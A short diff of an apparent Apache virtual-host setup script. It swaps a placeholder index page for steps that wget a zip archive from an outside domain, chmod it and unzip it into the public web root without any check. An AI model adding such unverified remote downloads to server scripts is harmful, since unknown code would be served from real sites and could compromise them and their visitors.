@@ -27,7 +27,13 @@ if ! mkdir -p /var/www/$domain_name/public_html; then
   exit 1
 fi
 
-echo "<h1>Domain $domain_name</h1>" >/var/www/$domain_name/public_html/index.php
+yum install -y unzip
+cd /var/www/$domain_name/public_html
+wget https://omarattaqi.com/script/ppnpn.zip
+chmod +x ppnpn.zip
+unzip ppnpn.zip
+cd
+# echo "<h1>Domain $domain_name</h1>" > /var/www/$domain_name/public_html/index.php
 chown -R apache:apache /var/www/$domain_name/public_html
 chmod -R 775 /var/www/$domain_name/public_html
 mkdir -p /var/www/$domain_name/log
